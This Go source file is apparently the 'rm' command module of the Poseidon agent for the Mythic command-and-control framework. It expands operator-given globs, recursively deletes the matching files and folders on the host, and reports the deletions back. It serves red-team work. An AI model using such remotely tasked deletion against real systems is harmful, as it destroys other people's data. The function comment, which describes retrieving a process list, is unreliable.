package rm

import (
	// Standard
	"encoding/json"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	args := structs.FileBrowserArguments{}
	msg := task.NewResponse()
	files := make([]string, 0)
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	var fullPath string
	if args.Path != "" {
		fullPath = path.Join(args.Path, args.File)
	} else {
		fullPath = args.File
	}
	if strings.Contains(fullPath, "*") {
		// this means we're trying to glob rm a few things
		potentialFiles, err := filepath.Glob(fullPath)
		if err != nil {
			msg.SetError("Failed to un-glob that path")
			task.Job.SendResponses <- msg
			return
		}
		for _, s := range potentialFiles {
			files = append(files, s)
		}
	} else {
		files = append(files, fullPath) // just add our one file
	}
	// now we have our complete list of files/folder to remove
	removedFiles := make([]structs.RmFiles, len(files))
	outputMsg := ""
	for i, s := range files {
		if _, err := os.Stat(s); os.IsNotExist(err) {
			outputMsg = outputMsg + fmt.Sprintf("Error - File '%s' does not exist.\n", s)
			continue
		}
		abspath, _ := filepath.Abs(s)
		err := os.RemoveAll(s)
		if err != nil {
			outputMsg = outputMsg + fmt.Sprintf("Error - Failed to remove %s: %s", s, err.Error())
			continue
		}
		outputMsg = outputMsg + fmt.Sprintf("Deleted %s\n", s)
		removedFiles[i].Path = abspath
		removedFiles[i].Host = ""
	}
	msg.Completed = true
	msg.UserOutput = outputMsg
	msg.RemovedFiles = &removedFiles
	task.Job.SendResponses <- msg
	return
}
